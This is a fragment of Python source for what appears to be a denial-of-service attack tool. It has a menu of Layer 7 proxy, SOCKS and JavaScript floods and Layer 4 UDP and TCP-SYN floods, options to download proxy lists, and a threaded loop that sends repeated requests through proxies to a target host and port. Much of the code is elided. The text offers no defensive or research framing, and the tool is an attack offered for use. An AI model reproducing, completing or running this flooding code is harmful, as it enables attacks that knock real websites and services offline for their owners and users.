...
def start_mode():
    ...
    print("""
[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
 # 0: Home      [ HOME ] # 5: UDP Flood     [ 50%/100% ] #
 # 1: Proxy     [ Method ] # 6: TCP-SYN Flood [ BETA ] #
 # 2: Socks     [ METHOD ] #                           #
 # 3: JS-Normal [ BETA ] #                           #
 # 4: Raw-DoS   [ BETA ] #                           #
[+]=================================================[+]
...
def choice_method_attack():
    ...
    print("-----------------------------")
    print("|_--> 1: Request [ Normal Send!]")
    print("|_--> 2: Request [  Spamming  ]")
...
def choice_down_proxies():
    ...
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Server 1(recomend)")
        print("|_--> 2: Server 2(Not recomend) ")
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Locked # Ms 958 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
